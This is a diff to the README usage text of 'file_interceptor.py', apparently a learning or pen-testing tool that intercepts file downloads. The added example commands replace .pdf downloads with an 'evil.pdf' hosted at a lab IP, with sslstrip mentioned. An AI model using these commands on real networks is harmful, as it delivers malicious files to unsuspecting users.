@@ -11,13 +11,21 @@
 ```shell
 usage: file_interceptor.py [-h] [-e EXTENSION] [-d DESTINATION] [-u URL]
 
+File replacement tool (use Bettercap hstshijack/hstshijack for sslstripping)
+
 optional arguments:
   -h, --help            show this help message and exit
   -e EXTENSION, --extension EXTENSION
-                        Specify a file extension
+                        File extension
   -d DESTINATION, --destination DESTINATION
-                        Destination (sslstrip, forward, local)
-  -u URL, --url URL     Specify a replace url
+                        sslstrip, forward, or local
+  -u URL, --url URL     Replacement url
+
+Example: 
+            file_interceptor.py # replace a .pdf with an evil.pdf file in location apache2 server on kali, sslstrip
+            file_interceptor.py -e .pdf -u 192.168.122.108/evil/evil.pdf            # replace a .pdf file
+            file_interceptor.py -e .pdf -u 192.168.122.108/evil/evil.pdf -d local   # test replacing a .pdf file
+                                                                                                                      
 ```
 
 ## Kicking the tyres
